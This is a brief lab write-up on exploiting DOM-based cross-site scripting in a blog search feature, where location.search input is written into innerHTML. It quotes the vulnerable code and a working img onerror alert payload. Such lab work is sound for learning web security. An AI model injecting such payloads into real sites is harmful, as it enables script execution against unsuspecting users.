# Lab: DOM XSS in innerHTML sink using source location.search

 >This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an innerHTML assignment, which changes the HTML contents of a div element, using data from location.search.

>To solve this lab, perform a cross-site scripting attack that calls the alert function. 

Vulnerable area: Blog search functionality

Found this js code:

`function doSearchQuery(query) {
    document.getElementById('searchMessage').innerHTML = query;
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    doSearchQuery(query);
}`

Because `.innerHTML` was used, we can inject our own html

I first tried the straightforward payload, but it didn't work:

`<script>alert('haha get pwned')</script>`

Was able to perform DOM XSS with the following payload:

`<img src='x' onerror='alert(1)'`

Lab solved!